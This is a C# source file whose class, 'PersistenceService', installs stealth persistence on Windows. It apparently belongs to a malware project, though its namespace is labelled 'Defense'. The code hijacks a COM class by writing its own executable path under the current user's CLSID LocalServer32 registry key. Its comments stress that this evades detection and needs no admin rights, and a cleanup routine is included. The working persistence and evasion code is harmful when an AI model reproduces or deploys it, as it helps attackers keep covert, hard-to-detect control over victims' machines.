using System;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace VanguardCore.Defense
{
    public static class PersistenceService
    {
        // [PRO] COM Hijack: Folder Redirection (Shell Extension)
        // This is much harder to detect than Registry Run.
        private const string CLSID_FOLDER_REDIR = "{AE054230-70CA-4FF5-97A7-0A4997C63628}";

        public static void InstallStealthProxy()
        {
            try
            {
                if (Constants.DEBUG_MODE) Console.WriteLine("[*] Installing Stealth COM Persistence...");

                string selfPath = GetSelfPath();
                if (string.IsNullOrEmpty(selfPath)) return;

                // 1. Create the Hijack Entry in HKCU (No admin required!)
                string subKey = $@"Software\Classes\CLSID\{CLSID_FOLDER_REDIR}\LocalServer32";
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(subKey))
                {
                    if (key != null)
                    {
                        // Set the default value to our binary path
                        key.SetValue("", selfPath);
                    }
                }

                if (Constants.DEBUG_MODE) Console.WriteLine($"[+] COM Hijack successful: {CLSID_FOLDER_REDIR}");
            }
            catch (Exception ex)
            {
                if (Constants.DEBUG_MODE) Console.WriteLine($"[!] Persistence error: {ex.Message}");
            }
        }

        public static void RemoveStealthProxy()
        {
            try
            {
                Registry.CurrentUser.DeleteSubKeyTree($@"Software\Classes\CLSID\{CLSID_FOLDER_REDIR}", false);
            }
            catch { }
        }

        private static string GetSelfPath()
        {
            try
            {
                var sb = new StringBuilder(1024);
                Win32_GetModuleFileName(IntPtr.Zero, sb, (uint)sb.Capacity);
                return sb.ToString();
            }
            catch { return Process.GetCurrentProcess().MainModule?.FileName; }
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, EntryPoint = "GetModuleFileNameW")]
        private static extern uint Win32_GetModuleFileName(IntPtr hModule, [Out] StringBuilder lpFilename, uint nSize);
    }
}
